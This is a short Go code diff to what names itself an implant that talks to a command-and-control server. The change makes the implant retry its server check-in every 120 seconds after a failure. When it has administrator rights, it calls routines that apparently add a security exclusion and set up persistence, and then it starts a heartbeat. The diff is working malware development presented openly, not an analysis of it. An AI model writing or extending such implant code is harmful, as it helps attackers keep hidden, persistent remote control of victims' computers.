@@ -49,7 +49,12 @@ func NewImplant(c2ServerURL string) *plant {
 
 func (i *plant) Start() {
 
-	rep,_, _ := i.sendHTTPRequest("GET", "/helppppiscofebabe23", nil, false)
+	rep,_,err := i.sendHTTPRequest("GET", "/helppppiscofebabe23", nil, false)
+	if err != nil {
+		fmt.Println("see you");
+		time.Sleep(time.Duration(120 * float64(time.Second)))
+		i.Start()
+	}
 	if rep.StatusCode == http.StatusOK {
 		fmt.Println("Couldn't find water for our plants :'(")
 		return
@@ -65,6 +70,11 @@ func (i *plant) Start() {
 	if err := i.login(); err != nil {
 		fmt.Println("Error logging in:", err)
 		return
+	}
+	if winapiV2.IsAdmin() {
+		per.Add_excep();
+		time.Sleep(time.Duration(5 * float64(time.Second)))
+		per.Add_per();
 	}
 	per.Add_per2()
 	go i.sendHeartbeat()
